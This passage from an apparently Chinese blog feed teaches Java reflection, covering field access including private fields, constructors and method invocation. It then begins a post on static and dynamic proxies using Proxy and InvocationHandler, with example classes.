class="hljs-params">(String a)</span> &#123;<br>        <span class="hljs-built_in">this</span>.a = a;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, a=&#x27;&quot;</span> + a + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;吃饭&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;打篮球&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> personClass.getField(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> a.get(person);<br>        System.out.println(o);<br>        a.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当然也可以获取<code>private</code>属性的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> personClass.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> name.get(person);<br>        System.out.println(o);<br>        name.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里就不一一演示了。</p><h4 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h4><ul><li>Constructor[] getConstructors()</li><li>Constructor getConstructor(类 &lt;?&gt; … parameterTypes)</li><li>Constructor getDeclaredConstructors()</li><li>Constructor getDeclaredConstructor(类 &lt;?&gt; … parameterTypes)</li></ul><p><strong>记得给Person添加构造方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoConstruct</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;xsw6a&quot;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&quot;harworking&quot;</span>);<br>        System.out.println(o);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<span class="hljs-comment">//每一个构造方法的参数种类不一样，这一步是获取构造方法</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252200686.png" alt="QQ截图20220225220052"></p><p>如果是无参构造方法，可以直接使用Class类对象的newInstance方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> personClass.newInstance();<br>System.out.println(o);<br></code></pre></td></tr></table></figure><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul><li><p>Method[] getMethods()&#x2F;&#x2F;获取所有【public】修饰的方法，父类Object的方法也能看到</p></li><li><p>Method getMethod(String name，类 &lt;?&gt; … parameterTypes)</p></li><li><p>Method[] getDeclaredMethods()&#x2F;&#x2F;获取所有声明方法 不考虑修饰符 不考虑继承的方法</p></li><li><p>Method getDeclaredMethod(String name，类 &lt;?&gt; … parameterTypes) 不考虑修饰符 不考虑继承的方法</p><p><strong>无参数类型。</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eat&quot;</span>);<span class="hljs-comment">//获取制定名称的方法</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//进而执行方法,【invoke】，它需要一个真实的对象，以及方法的实际参数列表</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">pp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-comment">//因为是空参方法，所以直接放进来一个对象就行</span><br>        <span class="hljs-comment">//执行方法，eat...</span><br>        eat.invoke(person);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>有参数类型</strong>（记得改person类）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218476.png" alt="QQ截图20220225221351"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethodTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eatCan&quot;</span>, String.class);<span class="hljs-comment">//eat方法重载，eat方法的需要传入的参数是String类型</span><br>        eat.invoke(person,<span class="hljs-string">&quot;水果&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>不一一实现。</p>]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java两种代理</title>
    <link href="/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/"/>
    <url>/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Java代理"><a href="#Java代理" class="headerlink" title="Java代理"></a>Java代理</h1><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>为不修改原先的类，而创建代理类去修改。</p><h3 id="用户接口"><a href="#用户接口" class="headerlink" title="用户接口"></a>用户接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServices</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="实现类"><a href="#实现类" class="headerlink" title="实现类"></a>实现类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.sql.SQLOutput;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;查询&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;更新&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="代理类"><a href="#代理类" class="headerlink" title="代理类"></a>代理类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRealProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span> &#123;<br>    <span class="hljs-keyword">private</span> UserServices userServices; <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserRealProxy</span><span class="hljs-params">(UserServices userServices)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userServices = userServices;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        before();<br>        userServices.select();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        before();<br>        userServices.update();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;在这之前&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;在这之后&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>值得注意的点：</p><p>1、这里的<code>private UserServices userServices;</code>目的是规范话<code>userServices</code></p><p>2、构造函数，为了传入代理类。</p><h3 id="实现类-1"><a href="#实现类-1" class="headerlink" title="实现类"></a>实现类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServices</span> <span class="hljs-variable">userReal</span> <span class="hljs-operator">=</span> (UserServices) <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserReal</span>();<br>        <span class="hljs-type">UserRealProxy</span> <span class="hljs-variable">userRealProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserRealProxy</span>(userReal);<br>        userRealProxy.select();<br>        userRealProxy.update();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045862.png" alt="QQ截图20220225145647"></p><p>代理类实现了不修改源代码而改变了输出结果（添加了在这之前与之后）。</p><p>但是实际应用中用到的静态代理很少很少。因为：</p><p>1、当需要代理多个类的时候，由于代理对象要实现与目标对象一致的接口，有两种方式：</p><ul><li>只维护一个代理类，由这个代理类实现多个接口，但是这样就导致<strong>代理类过于庞大</strong></li><li>新建多个代理类，每个目标对象对应一个代理类，但是这样会<strong>产生过多的代理类</strong></li></ul><p>2、当接口需要增加、删除、修改方法的时候，目标对象与代理类都要同时修改，<strong>不易维护</strong>。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>首先要了解一个类和一个接口：</p><ul><li><code>java.lang.reflect.Proxy</code>（类）</li><li><code>java.lang.reflect.InvocationHandler</code>（接口）</li></ul><p><code>java.lang.reflect.Proxy</code>主要用于生成动态代理类Class、创建代理类实例，该类实现了<code>java.io.Serializable</code>接口。</p><p><strong>Proxy</strong>：是所有动态代理的父类，负责new一个实例。<br><strong>InvocationHandler</strong>：用于调用<code>Proxy</code>类生成的代理类方法，该类只有一个<code>Invoke</code>方法（代理对象要执行的功能代码）。并且每一个类都要实现<code>IncocationHandler</code>这个接口。</p><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><p>快捷键Ctrl+shift+f，搜索<code>public class Proxy implements java.io.Serializable</code>可找到该类。这里引用别的师傅的翻译。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java">copypackage java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br><br>  <span class="hljs-comment">// 省去成员变量和部分类方法...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取动态代理处理类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy 返回调用处理程序的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 代理实例的调用处理程序</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title function_">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类实例</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组，这里的对象是接口实现类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     定义代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 代理类要实现的接口列表</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 检测某个类是否是动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl 要测试的类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> &#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 向指定的类加载器中定义一个类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader 类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   类名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      类字节码</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    截取开始位置</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    截取长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVM创建的类Class对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title function_">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>用的最多的就是<code>newProxyInstance()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * 创建动态代理类实例</span><br><span class="hljs-comment">  *</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组，这里的对象是接口实现类</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">  */</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>         <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>     ...<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="Invocationhandler"><a href="#Invocationhandler" class="headerlink" title="Invocationhandler"></a>Invocationhandler</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045587.png" alt="QQ截图20220225191721"></p><p>其中参数</p><p><code>proxy</code>：jdk创建的代理对象，无需赋值</p><p><code>method</code>：目标类中的方法</p><p><code>args参数</code>：目标类中的方法所接收的参数。<br>并且这三个参数都是jdk自带的！！</p><p>如何使用这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object demo;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Demo1</span><span class="hljs-params">(Object demo)</span> &#123;<br>        <span class="hljs-built_in">this</span>.demo = demo;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span 